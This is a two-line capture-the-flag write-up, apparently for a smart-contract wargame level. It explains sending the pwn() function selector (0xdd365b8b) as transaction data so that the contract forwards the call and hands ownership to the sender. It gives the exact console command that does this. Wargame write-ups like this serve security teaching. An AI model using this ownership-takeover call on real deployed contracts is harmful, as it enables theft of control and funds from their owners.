To solve this lvl we need to pass pwn() function indetifier as data in sendTransaction(). Contract will call pwn() and claim us ownership

await contract.sendTransaction({data: '0xdd365b8b'})
